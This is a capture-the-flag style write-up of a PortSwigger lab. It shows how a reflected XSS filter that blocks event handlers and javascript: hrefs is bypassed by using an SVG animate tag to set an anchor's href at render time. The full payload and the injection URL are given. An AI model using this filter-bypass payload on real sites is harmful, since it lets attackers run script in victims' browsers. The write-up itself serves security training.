# Lab 05 — Reflected XSS with Event Handlers and href Attributes Blocked

**Level:** Expert
**Type:** Reflected XSS + SVG Animate Bypass
**Status:** ✅ Solved
**Platform:** PortSwigger Web Academy

---

## 🎯 Objective
Bypass WAF that blocks ALL event handlers and anchor href attributes.
Inject a payload that calls `alert()` when the user clicks it.
Must be labeled with the word "Click" to get simulated user to click.

---

## 🧠 Concept
When all events (onclick, onfocus, onload etc.) are blocked
and href="javascript:..." is also blocked —
SVG animation tags offer an alternative execution path.

SVG has a special tag `<animate>` with an `attributeName` property.
We can use `<animate>` to dynamically SET an href attribute
at render time — bypassing the static WAF filter.

The WAF checks what you submit statically.
SVG animate sets the value AFTER the WAF check — bypass!

---

## 🪜 Steps to Reproduce

### Step 1 — Confirm Events Are Blocked
<img src=1 onclick=alert(1)>  → Blocked
<a href="javascript:alert(1)">Click</a>  → Blocked

### Step 2 — Try SVG Tag (Whitelisted)

<svg>  → 200 OK ✅
<svg><a>  → 200 OK ✅
<svg><animate>  → 200 OK ✅

### Step 3 — Use animate to Set href Dynamically
```html
<svg>
  <a>
    <animate 
      attributeName="href" 
      values="javascript:alert(1)" 
      begin="0s">
    </animate>
    <text x="50" y="50">Click</text>
  </a>
</svg>
```

### Step 4 — Inject via Search Parameter

https://YOUR-LAB-ID.web-security-academy.net/
?search=<svg><a><animate+attributeName=href+values=javascript:alert(1)+begin=0s></animate><text+x=50+y=50>Click</text></a></svg>

### Step 5 — Simulated user clicks "Click" text
→ href is now set to `javascript:alert(1)` by animate
→ `alert()` fires ✅
→ Lab solved ✅

---

## 💉 Final Payload
```html
<svg>
  <a>
    <animate attributeName="href" values="javascript:alert(1)" begin="0s">
    </animate>
    <text x="50" y="50">Click</text>
  </a>
</svg>
```

---

## 🔍 Why It Works

| Part | Reason |
|------|---------|
| `<svg>` | SVG tags whitelisted by WAF |
| `<a>` inside SVG | SVG anchor — different from HTML anchor |
| `<animate>` | SVG animation — sets attributes dynamically |
| `attributeName="href"` | Targets the href attribute to animate |
| `values="javascript:alert(1)"` | Sets href value AFTER WAF check |
| `begin="0s"` | Animation starts immediately on load |
| `<text>Click</text>` | Displays "Click" to induce user click |

---

## ⚡ WAF Bypass Logic
WAF checks submitted input → sees no href, no event handlers → Allows it
Browser renders SVG → animate sets href="javascript:alert(1)" at runtime
User clicks "Click" → javascript: executes → alert() fires